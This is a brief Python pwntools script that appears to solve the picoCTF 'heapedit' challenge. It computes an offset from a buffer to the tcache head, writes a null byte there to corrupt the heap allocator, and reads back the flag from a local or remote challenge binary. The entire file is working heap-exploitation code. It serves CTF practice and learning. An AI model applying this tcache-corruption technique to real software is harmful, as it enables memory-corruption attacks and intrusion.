#!/usr/bin/env python3

from pwn import *

HEAD_OF_TCACHE = 0x602088
BUFFER_ADDED_TO = 0x6034a0
VALUE = '\x00'

def conn():
    if len(args) > 0 and args.get('LOCAL'):
        r = process('./heapedit', env={'LD_PRELOAD':'./ld-2.27.so:./libc.so.6'})
    else:
        r = remote("mercury.picoctf.net", 34499)
    return r


def main():
    r = conn()

    # Calculate the offset
    offset = HEAD_OF_TCACHE - BUFFER_ADDED_TO

    # Receive data until we see the following, then send our data.
    r.sendlineafter(b'Address: ', str(offset))
    print(str(offset))
    r.sendlineafter(b'Value: ', VALUE)

    # Get the flag.
    flag = r.recvline()
    print(flag)
    return flag


if __name__ == "__main__":
    main()
